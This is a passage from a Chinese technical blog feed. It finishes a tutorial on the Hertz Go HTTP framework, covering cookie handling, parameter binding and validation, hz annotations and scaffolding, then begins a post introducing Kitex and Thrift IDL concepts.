<p>注意 cookie 是单条获取、单个写入的，如果要写入多个 cookie，需要重复多次。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">h.GET(<span class="string">"/cookie"</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, c *app.RequestContext)</span></span> {</span><br><span class="line">    mc := <span class="string">"myCookie"</span></span><br><span class="line">    <span class="comment">// get specific key</span></span><br><span class="line">    <span class="comment">// 获取cookie值</span></span><br><span class="line">    val := c.Cookie(mc)</span><br><span class="line">    <span class="comment">// 新建cookie</span></span><br><span class="line">    <span class="keyword">if</span> val == <span class="literal">nil</span> {</span><br><span class="line">        <span class="comment">// set a cookie</span></span><br><span class="line">        fmt.Printf(<span class="string">"There is no cookie named: %s, and make one...\n"</span>, mc)</span><br><span class="line">        cookie := protocol.AcquireCookie()</span><br><span class="line">        <span class="comment">// 只能设置一个key、一个value</span></span><br><span class="line">        cookie.SetKey(<span class="string">"myCookie"</span>)</span><br><span class="line">        cookie.SetValue(<span class="string">"a nice cookie!"</span>)</span><br><span class="line">        <span class="comment">// 有效时间</span></span><br><span class="line">        cookie.SetExpire(time.Now().Add(<span class="number">3600</span> * time.Second))</span><br><span class="line">        cookie.SetPath(<span class="string">"/"</span>)</span><br><span class="line">        cookie.SetHTTPOnly(<span class="literal">true</span>)</span><br><span class="line">        cookie.SetSecure(<span class="literal">false</span>)</span><br><span class="line">        <span class="comment">// 写入响应头</span></span><br><span class="line">        c.Response.Header.SetCookie(cookie)</span><br><span class="line">        <span class="comment">// 将cookie对象放回cookie池中</span></span><br><span class="line">        protocol.ReleaseCookie(cookie)</span><br><span class="line">        c.WriteString(<span class="string">"A cookie is ready."</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"Got a cookie: %s\nAnd eat it!"</span>, val)</span><br><span class="line">    <span class="comment">// instruct upload_file to delete a cookie</span></span><br><span class="line">    <span class="comment">// DelClientCookie instructs the upload_file to remove the given cookie.</span></span><br><span class="line">    <span class="comment">// This doesn't work for a cookie with specific domain or path,</span></span><br><span class="line">    <span class="comment">// you should delete it manually like:</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//      c := AcquireCookie()</span></span><br><span class="line">    <span class="comment">//      c.SetKey(mc)</span></span><br><span class="line">    <span class="comment">//      c.SetDomain("example.com")</span></span><br><span class="line">    <span class="comment">//      c.SetPath("/path")</span></span><br><span class="line">    <span class="comment">//      c.SetExpire(CookieExpireDelete)</span></span><br><span class="line">    <span class="comment">//      h.SetCookie(c)</span></span><br><span class="line">    <span class="comment">//      ReleaseCookie(c)</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 删除 Response 中的 cookie</span></span><br><span class="line">    c.Response.Header.DelClientCookie(mc)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造新的 cookie</span></span><br><span class="line">    <span class="comment">// construct the full struct of a cookie in response's header</span></span><br><span class="line">    respCookie := protocol.AcquireCookie()</span><br><span class="line">    respCookie.SetKey(mc)</span><br><span class="line">    c.Response.Header.Cookie(respCookie)</span><br><span class="line">    fmt.Printf(<span class="string">"(The expire time of cookie is set to: %s)\n"</span>, respCookie.Expire())</span><br><span class="line">    protocol.ReleaseCookie(respCookie)</span><br><span class="line">    c.WriteString(<span class="string">"The cookie has been eaten."</span>)</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<h3 id="参数绑定">参数绑定</h3>
<p>参数绑定包含以下 API：</p>
<table>
<colgroup>
<col style="width: 25%">
<col style="width: 74%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">API</th>
<th style="text-align: left;"> 说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"> ctx.BindAndValidate</td>
<td style="text-align: left;"> 利用下述的 go-tag 进行参数绑定，并在绑定成功后做一次参数校验 (如果有校验 tag 的话)</td>
</tr>
<tr class="even">
<td style="text-align: left;">ctx.Bind</td>
<td style="text-align: left;"> 同 <code>BindAndValidate</code> 但是不做参数校验</td>
</tr>
<tr class="odd">
<td style="text-align: left;"> ctx.BindQuery</td>
<td style="text-align: left;"> 绑定所有 Query 参数，相当于给每一个 field 声明一个 <code>query</code> tag，适用于没写 tag 的场景</td>
</tr>
<tr class="even">
<td style="text-align: left;"> ctx.BindHeader</td>
<td style="text-align: left;"> 绑定所有 Header 参数，相当于给每一个 field 声明一个 <code>header</code> tag，适用于没写 tag 的场景</td>
</tr>
<tr class="odd">
<td style="text-align: left;"> ctx.BindPath</td>
<td style="text-align: left;"> 绑定所有 Path 参数，相当于给每一个 field 声明一个 <code>path</code> tag，适用于没写 tag 的场景</td>
</tr>
<tr class="even">
<td style="text-align: left;"> ctx.BindForm</td>
<td style="text-align: left;"> 绑定所有 Form 参数，相当于给每一个 field 声明一个 <code>form</code> tag，需要 Content-Type 为：<code>application/x-www-form-urlencoded</code>/<code>multipart/form-data</code>, 适用于没写 tag 的场景</td>
</tr>
<tr class="odd">
<td style="text-align: left;"> ctx.BindJSON</td>
<td style="text-align: left;"> 绑定 JSON Body，调用 <code>json.Unmarshal()</code> 进行反序列化，需要 Body 为 <code>application/json</code> 格式</td>
</tr>
<tr class="even">
<td style="text-align: left;"> ctx.BindProtobuf</td>
<td style="text-align: left;"> 绑定 Protobuf Body，调用 <code>proto.Unmarshal()</code> 进行反序列化，需要 Body 为 <code>application/x-protobuf</code> 格式</td>
</tr>
<tr class="odd">
<td style="text-align: left;"> ctx.BindByContentType</td>
<td style="text-align: left;"> 根据 Content-Type 来自动选择绑定的方法，其中 GET 请求会调用 <code>BindQuery</code>, 带有 Body 的请求会根据 Content-Type 自动选择</td>
</tr>
<tr class="even">
<td style="text-align: left;"> ctx.Validate</td>
<td style="text-align: left;"> 进行参数校验，需要校验 tag 配合使用 (默认使用 vd tag 校验)</td>
</tr>
</tbody>
</table>
<p>自定义函数校验的例子如下。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"context"</span></span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"time"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/app"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/app/client"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/app/server"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/app/server/binding"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/protocol"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/protocol/consts"</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 使用test函数进行校验</span></span><br><span class="line"><span class="keyword">type</span> ValidateStruct <span class="keyword">struct</span> {</span><br><span class="line">	A <span class="keyword">string</span> <span class="string">`query:"a" vd:"test($)"`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">	validateConfig := binding.NewValidateConfig()</span><br><span class="line">    <span class="comment">// 注册校验函数</span></span><br><span class="line">	validateConfig.MustRegValidateFunc(<span class="string">"test"</span>, <span class="function"><span class="keyword">func</span><span class="params">(args ...<span class="keyword">interface</span>{})</span> <span class="title">error</span></span> {</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(args) != <span class="number">1</span> {</span><br><span class="line">			<span class="keyword">return</span> fmt.Errorf(<span class="string">"the args must be one"</span>)</span><br><span class="line">		}</span><br><span class="line">		s, _ := args[<span class="number">0</span>].(<span class="keyword">string</span>)</span><br><span class="line">		<span class="keyword">if</span> s == <span class="string">"123"</span> {</span><br><span class="line">			<span class="keyword">return</span> fmt.Errorf(<span class="string">"the args can not be 123"</span>)</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	})</span><br><span class="line">	h := server.Default(server.WithHostPorts(<span class="string">"127.0.0.1:8080"</span>))</span><br><span class="line"></span><br><span class="line">	h.GET(<span class="string">"customValidate"</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, c *app.RequestContext)</span></span> {</span><br><span class="line">		<span class="keyword">var</span> req ValidateStruct</span><br><span class="line">        <span class="comment">// 绑定参数</span></span><br><span class="line">		err := c.Bind(&amp;req)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">			fmt.Printf(<span class="string">"error: %v\n"</span>, err)</span><br><span class="line">		}</span><br><span class="line">        <span class="comment">// 校验</span></span><br><span class="line">		err = c.Validate(&amp;req)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">			fmt.Printf(<span class="string">"error: %v\n"</span>, err)</span><br><span class="line">		}</span><br><span class="line">	})</span><br><span class="line"></span><br><span class="line">	<span class="keyword">go</span> h.Spin()</span><br><span class="line"></span><br><span class="line">	time.Sleep(<span class="number">1000</span> * time.Millisecond)</span><br><span class="line">	c, _ := client.NewClient()</span><br><span class="line">	req := protocol.Request{}</span><br><span class="line">	resp := protocol.Response{}</span><br><span class="line">	req.SetMethod(consts.MethodGet)</span><br><span class="line">	req.SetRequestURI(<span class="string">"http://127.0.0.1:8080/customValidate?a=123"</span>)</span><br><span class="line">	c.Do(context.Background(), &amp;req, &amp;resp)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="hz">hz</h2>
<p>Hertz 的一大优势就在于，可以通过 hz 工具，根据 IDL 生成项目脚手架，非常便捷易用。hz 支持 Thrift 与 Protobuf 两种 IDL，在基础的 IDL 的基础上，hz 提供了<a href="https://www.cloudwego.io/zh/docs/hertz/tutorials/toolkit/annotation/">注解</a>能力满足 HTTP 框架所需的参数绑定、校验、路由注册功能。</p>
<h3 id="field-注解">Field 注解</h3>
<table>
<colgroup>
<col style="width: 38%">
<col style="width: 61%">
</colgroup>
<thead>
<tr class="header">
<th>注解</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> api.raw_body</td>
<td> 生成 “raw_body” tag，绑定 body bytes，优先级最低</td>
</tr>
<tr class="even">
<td> api.query</td>
<td> 生成 “query” tag，绑定 query 中参数，例如 “?query=hertz&amp;…”</td>
</tr>
<tr class="odd">
<td>api.header</td>
<td> 生成 “header” tag，绑定 header</td>
</tr>
<tr class="even">
<td>api.cookie</td>
<td> 生成 “cookie” tag，绑定 cookie</td>
</tr>
<tr class="odd">
<td>api.body</td>
<td> 生成 “json” tag，绑定 body form 中的 "key-value"，“content-type” 需为 "application/json"</td>
</tr>
<tr class="even">
<td>api.path</td>
<td> 生成 “path” tag，绑定路由中的参数</td>
</tr>
<tr class="odd">
<td> api.form</td>
<td> 生成 “form” tag，绑定 body form 中的 "key-value"<br>“content-type” 需为 "multipart/form-data" 或 "application/x-www-form-urlencoded"</td>
</tr>
<tr class="even">
<td>api.go_tag (protobuf) go.tag (thrift)</td>
<td> 透传 go_tag，会生成 go_tag 里定义的内容</td>
</tr>
<tr class="odd">
<td> api.vd</td>
<td> 生成 “vd” tag，用于参数校验</td>
</tr>
<tr class="even">
<td> api.none</td>
<td> 生成 “-” tag，不参与参数绑定与序列化，详情参考 <a href="https://www.cloudwego.io/zh/docs/hertz/tutorials/toolkit/more-feature/api_none/">api.none 注解说明</a></td>
</tr>
</tbody>
</table>
<p>参数绑定优先级如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">path &gt; form &gt; query &gt; cookie &gt; header &gt; json &gt; raw_body</span><br></pre></td></tr></tbody></table></figure>
<h3 id="method注解">Method 注解</h3>
<table>
<thead>
<tr class="header">
<th>注解</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> api.get</td>
<td> 定义 GET 方法及路由</td>
</tr>
<tr class="even">
<td> api.post</td>
<td> 定义 POST 方法及路由</td>
</tr>
<tr class="odd">
<td> api.put</td>
<td> 定义 PUT 方法及路由</td>
</tr>
<tr class="even">
<td> api.delete</td>
<td> 定义 DELETE 方法及路由</td>
</tr>
<tr class="odd">
<td> api.patch</td>
<td> 定义 PATCH 方法及路由</td>
</tr>
<tr class="even">
<td> api.options</td>
<td> 定义 OPTIONS 方法及路由</td>
</tr>
<tr class="odd">
<td> api.head</td>
<td> 定义 HEAD 方法及路由</td>
</tr>
<tr class="even">
<td> api.any</td>
<td> 定义 ANY 方法及路由</td>
</tr>
</tbody>
</table>
<p>绑定 HTTP 方法及路由，很直观。</p>
<h3 id="案例">案例</h3>
<p>idl，hello.thrift 如下，使用了很多的 hz 注解。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">struct MultiTagRequest {</span><br><span class="line">    1: required string QueryTag (api.query = "query"),</span><br><span class="line">    2: required string RawBodyTag (api.raw_body = "raw_body"),</span><br><span class="line">    3: required string PathTag (api.path = "path"),</span><br><span class="line">    4: required string FormTag (api.form = "form"),</span><br><span class="line">    5: required string HeaderTag (api.header = "header"),</span><br><span class="line">    6: required string BodyTag (api.body = "body"),</span><br><span class="line">    7: required string GoTag (go.tag = "json:\"go\" goTag:\"tag\""),</span><br><span class="line">    8: required string VdTag (api.vd = "$!='?'"),</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">struct Request {</span><br><span class="line">    1: required string id,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">struct Response {</span><br><span class="line">    1: required string id,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">service Hertz {</span><br><span class="line">    Response Method(1: MultiTagRequest request) (api.get = "/company/:path/hello"),</span><br><span class="line">    Response Method1(1: Request request) (api.get = "/company/department/group/user:id/name"),</span><br><span class="line">    Response Method2(1: Request request) (api.post = "/company/department/group/user:id/sex"),</span><br><span class="line">    Response Method3(1: Request request) (api.put = "/company/department/group/user:id/number"),</span><br><span class="line">    Response Method4(1: Request request) (api.delete = "/company/department/group/user:id/age"),</span><br><span class="line">    Response Method5(1: Request request) (api.options = "/school/class/student/name"),</span><br><span class="line">    Response Method6(1: Request request) (api.head = "/school/class/student/number"),</span><br><span class="line">    Response Method7(1: Request request) (api.patch = "/school/class/student/sex"),</span><br><span class="line">    Response Method8(1: Request request) (api.any = "/school/class/student/grade/ubjects"),</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>然后，运行 <code>hz new -idl hello.thrfit</code>，生成脚手架，并 <code>go mod tidy</code> 安装依赖，目录结构如下。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">❯ tree -r .                                                                                                        </span><br><span class="line">.</span><br><span class="line">├── script</span><br><span class="line">│&nbsp;&nbsp; └── bootstrap.sh</span><br><span class="line">├── router_gen.go</span><br><span class="line">├── router.go</span><br><span class="line">├── main.go</span><br><span class="line">├── hello.thrift</span><br><span class="line">├── go.sum</span><br><span class="line">├── go.mod</span><br><span class="line">├── build.sh</span><br><span class="line">└── biz</span><br><span class="line">    ├── router</span><br><span class="line">    │&nbsp;&nbsp; ├── register.go</span><br><span class="line">    │&nbsp;&nbsp; └── hello</span><br><span class="line">    │&nbsp;&nbsp;     ├── middleware.go</span><br><span class="line">    │&nbsp;&nbsp;     └── hello.go</span><br><span class="line">    ├── model</span><br><span class="line">    │&nbsp;&nbsp; └── hello</span><br><span class="line">    │&nbsp;&nbsp;     └── hello.go</span><br><span class="line">    └── handler</span><br><span class="line">        ├── ping.go</span><br><span class="line">        └── hello</span><br><span class="line">            └── hertz.go</span><br></pre></td></tr></tbody></table></figure>
<p>下面我们逐个分析。</p>
<h3 id="main.go">main.go</h3>
<p>项目的入口文件，创建 server、注册路由并运行。如果要修改服务选项，可以在 <code>server.Default()</code> 中传入 options。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">	h := server.Default()</span><br><span class="line"></span><br><span class="line">	register(h)</span><br><span class="line">	h.Spin()</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="router.go">router.go</h3>
<p>自定义路由，默认会注册 <code>/ping</code> 用于调试。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// customizeRegister registers customize routers.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">customizedRegister</span><span class="params">(r *server.Hertz)</span></span> {</span><br><span class="line">	r.GET(<span class="string">"/ping"</span>, handler.Ping)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// your code ...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="router_gen.go">router_gen.go</h3>
<p>由 <code>main</code> 函数调用，注册所有路由，即 idl 中定义的与用户自定义的。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// register registers all routers.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">register</span><span class="params">(r *server.Hertz)</span></span> {</span><br><span class="line"></span><br><span class="line">	router.GeneratedRegister(r)</span><br><span class="line"></span><br><span class="line">	customizedRegister(r)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="hz-1">.hz</h3>
<p>标识项目由 <code>hz</code> 工具搭建。</p>
<h3 id="biz">biz/</h3>
<p>业务逻辑目录。</p>
<h4 id="handler">handler/</h4>
<p>HandlerFunc 的逻辑。</p>
<h5 id="hello">hello/</h5>
<p>对应 <code>hello.thrift</code>，<code>hertz.go</code> 来源于定义的 <code>service Hertz</code>。一个 HandlerFunc 例子如下，帮我们完成了参数的绑定校验以及响应的渲染。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Method .</span></span><br><span class="line"><span class="comment">// @router /company/:path/hello [GET]</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Method</span><span class="params">(ctx context.Context, c *app.RequestContext)</span></span> {</span><br><span class="line">	<span class="keyword">var</span> err error</span><br><span class="line">	<span class="keyword">var</span> req hello.MultiTagRequest</span><br><span class="line">	err = c.BindAndValidate(&amp;req)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		c.String(consts.StatusBadRequest, err.Error())</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	resp := <span class="built_in">new</span>(hello.Response)</span><br><span class="line"></span><br><span class="line">	c.JSON(consts.StatusOK, resp)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h4 id="model">model/</h4>
<p>idl 中的结构体，也就是 model 层。</p>
<h5 id="hellohello.go">hello/hello.go</h5>
<p>同样，名字对应 <code>hello.thrift</code>。一个 Request 代码如下，thrift tag 用于 thrift 序列化和反序列化，json tag 用于 json 序列化与反序列化，query/path/form 等 tag 用于参数绑定。这些都是 hz 工具根据 idl 与注解生成的。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MultiTagRequest <span class="keyword">struct</span> {</span><br><span class="line">	QueryTag   <span class="keyword">string</span> <span class="string">`thrift:"QueryTag,1,required" json:"QueryTag,required" query:"query,required"`</span></span><br><span class="line">	RawBodyTag <span class="keyword">string</span> <span class="string">`thrift:"RawBodyTag,2,required" json:"RawBodyTag,required" raw_body:"raw_body,required"`</span></span><br><span class="line">	PathTag    <span class="keyword">string</span> <span class="string">`thrift:"PathTag,3,required" json:"PathTag,required" path:"path,required"`</span></span><br><span class="line">	FormTag    <span class="keyword">string</span> <span class="string">`thrift:"FormTag,4,required" form:"form,required" json:"FormTag,required"`</span></span><br><span class="line">	HeaderTag  <span class="keyword">string</span> <span class="string">`thrift:"HeaderTag,5,required" header:"header,required" json:"HeaderTag,required"`</span></span><br><span class="line">	BodyTag    <span class="keyword">string</span> <span class="string">`thrift:"BodyTag,6,required" form:"body,required" json:"body,required"`</span></span><br><span class="line">	GoTag      <span class="keyword">string</span> <span class="string">`thrift:"GoTag,7,required" json:"go" goTag:"tag" form:"GoTag,required" query:"GoTag,required"`</span></span><br><span class="line">	VdTag      <span class="keyword">string</span> <span class="string">`thrift:"VdTag,8,required" form:"VdTag,required" json:"VdTag,required" query:"VdTag,required" vd:"$!='?'"`</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h4 id="router">router/</h4>
<p>路由注册逻辑。在 <code>middlerware.go</code> 可以为每个路由使用单独的中间件。</p>
<h3 id="更新">更新</h3>
<p>如果 idl 发生了变更，或者新加了服务，可以通过 <code>hz update</code> 来对项目进行更新。</p>
<p>新建一个 <code>bye.thrift</code>，代码如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> Request {</span><br><span class="line">    <span class="number">1</span>: required <span class="keyword">string</span> id,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Response {</span><br><span class="line">    <span class="number">1</span>: required <span class="keyword">string</span> id,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">service ByeBye {</span><br><span class="line">    Response bye(<span class="number">1</span>: Request req) (api.get = <span class="string">"/bye"</span>),</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>输入 <code>hz update -idl bye.thrift</code>，可以发现 <code>biz</code> 目录下的目录都新增了 <code>bye/</code> 文件夹，存放相关的 Handler、model。</p>
<h2 id="总结">总结</h2>
<p>本篇博客介绍了 Hertz 框架的基本使用，通过 hz 工具构建项目并进行分析。相信读完本篇博客，读者可以基本掌握 Hertz 的用法，更深的用法（例如中间件等）可以参考官方文档。按原本的计划，我本该去读 Hertz 源码，了解背后原理。但我后来发现，作为初学者，能够掌握框架用法就已经够了，更深入的读源码并不会给日常开发带来多大帮助。而 Redis、消息队列这些中间件，则是需要深入了解原理，它们构建了后端服务的核心缓存和业务流转逻辑，稍有不慎就会危害线上服务，造成重大事故。因此，我后面会花更多时间在这些知识的学习上，框架会用即可。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.cloudwego.io/zh/blog/2022/06/21/字节跳动开源-go-http-框架-hertz-设计实践/">字节跳动开源 Go HTTP 框架 Hertz 设计实践 | CloudWeGo</a></li>
<li><a href="https://www.cloudwego.io/zh/docs/hertz/">Hertz | CloudWeGo</a></li>
<li><a href="https://www.cloudwego.io/zh/docs/hertz/tutorials/basic-feature/binding-and-validate/">绑定与校验 | CloudWeGo</a></li>
</ul>
]]></content>
      <categories>
        <category>后端</category>
        <category>微服务</category>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>微服务</tag>
        <tag>HTTP</tag>
        <tag>Hertz</tag>
        <tag>字节跳动</tag>
      </tags>
  </entry>
  <entry>
    <title>RPC 微服务框架 Kitex 的入门实践</title>
    <url>/blog/2024/01/16/Kitex-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>Kitex 是字节跳动开源的 Golang 微服务 RPC 框架，基于 Apache Thrift，具有<strong>高性能</strong>、<strong>强可扩展</strong>的特点，在字节内部已广泛使用。本篇是 Kitex 入门系列的第一篇，梳理相关的概念，并从案例上手实践。 <span id="more"></span></p>
<h2 id="thrift">Thrift</h2>
<p><a href="https://thrift.apache.org/"><code>Thrift</code></a>是一个<strong>轻量级</strong>、<strong>跨语言</strong>的<strong>远程服务调用（Remove Procedure Call，RPC）</strong>框架，最初由 <code>Facebook</code> 开发，后面进入 <code>Apache</code> 开源项目。它通过自身的 <code>IDL</code><strong>中间语言（Interface Description Language，接口描述语言）</strong>, 并借助<strong>代码生成引擎</strong>生成各种主流语言的 <code>RPC</code><strong>服务端</strong> / <strong>客户端</strong>模板代码。</p>
<p>Thrift 的一大优势就是可以跨语言代码生成，支持 C++, Java, Python, PHP, Ruby, Erlang, Perl, Haskell, C#, Cocoa, JavaScript, Node.js 等语言。</p>
<h3 id="架构">架构</h3>
<p>Thrift API 的客户端 - 服务端架构图如下所示：</p>
<ul>
<li>顶层是根据 IDL 生成的客户端 / 服务端代码</li>
<li>协议层（TProtocol）定义了序列化和反序列化的协议，包含 TBinaryProtocol （二进制协议）、TCompactProtocol （压缩二进制协议）、TJSONProtocol（JSON 文本）、TSimpleJSONProtocol 等</li>
<li>传输层（TTransport）定义了网络传输的方式，基于 TCP/IP 协议，包含 TSocket（阻塞 Socket）、TSimpleFileTransport（文件传输）、TFramedTransport（帧传输）等</li>
</ul>
<p><img src="Apache_Thrift_architecture.png"></p>
<h3 id="服务端模型">服务端模型</h3>
<p>Thrift 支持以下几种服务端模型：</p>
<ul>
<li>TSimpleServer：简单的单线程服务模型，常用于测试；</li>
<li>TThreadedServer：多线程服务模型，每个连接新建线程，使用标准阻塞 IO；</li>
<li>TThreadPoolServer：多线程服务模型，使用<strong>线程池</strong>，使用标准的阻塞式 IO；</li>
<li>TNonblockingServer：多线程服务模型，使用非阻塞式 IO（需使用 TFramedTransport 数据传输方式）；</li>
</ul>
<h3 id="idl">IDL</h3>
<h4 id="基础数据类型"><strong>基础数据类型</strong></h4>
<ul>
<li>bool：布尔型（true or false）；</li>
<li>byte：8bit、有符号整型。</li>
<li>i16、i32、i64：16/32/64 bit 有符号整型。</li>
<li>double：64 位浮点数</li>
<li> string：UTF-8 字符串</li>
</ul>
<p>没有定义无符号整数类型，因为很多语言中没有原生的无符号整数类型。</p>
<h4 id="特殊类型"><strong>特殊类型</strong></h4>
<ul>
<li>binary：字节序列</li>
</ul>
<h4 id="结构体"><strong>结构体</strong></h4>
<p>使用 struct 定义，一系列字段的集合，不支持继承。一个例子如下所示。结构体中每个字段需要用唯一的整型标识，用于序列化与反序列化，可以通过 <code>required/optional</code> 关键字定义字段是否必须，可以用 <code>=</code> 指定默认值。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">struct Work {</span><br><span class="line">  1: i32 num1 = 0</span><br><span class="line">  2: required i32 num2</span><br><span class="line">  3: string op</span><br><span class="line">  4: optional string comment</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>Thrift 支持以下三种字段必要性标识，决定了序列化和反序列化的行为：</p>
<p><strong>required</strong></p>
<ul>
<li>写：字段总是被写入，需要被赋值</li>
<li>读：字段总是被读取，输入流中必须包含，如果缺失则会<strong>抛出异常</strong>或者返回 error</li>
<li> 默认值：总是被写入</li>
<li> required 字段会限制版本的平滑过渡。如果新增 / 移除了 required 字段，都可能导致读取失败。</li>
</ul>
<p><strong>optional</strong></p>
<ul>
<li>写：只有被设置了才会被写入</li>
<li>读：可能出现在输入流中，也可以不存在</li>
<li>默认值：只有当设置了 <code>isset</code> 标识才会写入</li>
<li>很多语言的实现中，使用 <code>isset</code> 标识可选字段是否被赋值。只有设置了这个标识的字段才会被写入，反过来只有输入流中存在该字段才会设置 <code>isset</code></li>
</ul>
<p><strong>default（隐式默认）</strong></p>
<ul>
<li>写：理论上，总是被写入，除非特殊情况</li>
<li>读：与 optional 类似，可能出现在输入流中，也可以不存在</li>
<li>默认值：可能不会被写入</li>
</ul>
<p>default 类似 required 和 optional 的混合，取决于具体的实现。例如，实现中可以不写入默认值，因为假设读取时会自动补充默认值；也可以写入默认值，没有限制不能这么做。</p>
<p>需要注意的是，未写入的默认值成为了 idl 版本的一部分，如果后续默认值出现了变更，接口就会发生变化。而如果默认值被写入了，即使 IDL 中的默认值改变，也不会影响序列化数据。</p>
<ul>
<li>也就是说，不把默认值写入，读取侧只能依赖于 idl 中的默认值填充。写入了默认值，读取侧就可以只从数据中读取了。</li>
</ul>
<h4 id="容器"><strong>容器</strong></h4>
<ul>
<li>map&lt;type1,type2&gt;：键值字典</li>
<li> list&lt;type&gt;：有序列表</li>
<li> set&lt;type&gt;：无序集合</li>
</ul>
<p>理论上，容器的类型可以是任意合法的 Thrift 类型。但为了兼容性考虑，map 的 key 应当是基础类型。这是由于一些语言不允许复杂的键类型。此外，JSON 中也只支持基础类型的 key。</p>
<h4 id="异常">异常</h4>
<p>异常在语法和功能上类似于结构体，只不过异常使用关键字 exception 而不是 struct 关键字声明。但它在语义上不同于结构体，当定义一个 RPC 服务时，开发者可能需要声明一个远程方法抛出一个异常。在 Golang 中，不使用异常机制，因此可以忽略。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">exception InvalidOperation {</span><br><span class="line">  1: i32 what,</span><br><span class="line">  2: string why </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h4 id="服务">服务</h4>
<p>服务类似于接口，是一系列抽象函数的集合。函数的声明与 C 中文法类似，返回类型在最前，然后是函数名、参数列表（每个参数需要整型 id 标识）。一个例子如下所示，函数可以使用 <code>oneway</code> 标识符表示 client 发出请求后不必等待结果，也就是异步调用。</p>
